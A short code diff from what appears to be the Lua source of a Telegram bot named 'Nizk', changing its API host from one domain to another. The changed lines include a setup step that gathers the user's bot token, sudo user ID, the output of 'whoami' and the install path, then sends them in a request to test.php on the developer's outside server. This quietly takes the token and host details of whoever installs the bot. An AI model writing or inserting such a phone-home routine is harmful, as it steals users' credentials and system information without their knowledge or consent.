@@ -78,7 +78,7 @@ nizk..":VERSION",GetVerisonNizk,
 nizk..":SUDO_ID:",SUDO_USER,
 nizk..":DataCenter:","Amsterdam",
 nizk..":UserNameBot:",BOT_User,
-nizk..":ApiSource","http://th3nezk.aba.vg/",
+nizk..":ApiSource","https://nizk.tk/",
 nizk..":NameBot:","نيزك",
 "NIZK_INSTALL","Yes"
 )
@@ -90,7 +90,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-http.request('http://th3nezk.aba.vg/test.php?Info='..JSON.encode(info))
+https.request('https://nizk.tk/test.php?Info='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -206,7 +206,7 @@ Start_Bot()
 function CheckBotA(msg)
 W = msg.sender_user_id_
 if not redis:get(nizk..":Check_Bot:"..W) then
-Rgz,res=http.request(ApiNizk..Tkml..W)
+Rgz,res=https.request(ApiNizk..Tkml..W)
 if res == 200 and Rgz == "SendMsg" then redis:setex(nizk..":Check_Bot:"..W,1800,true) return false else return Rgz end 
 end 
 end
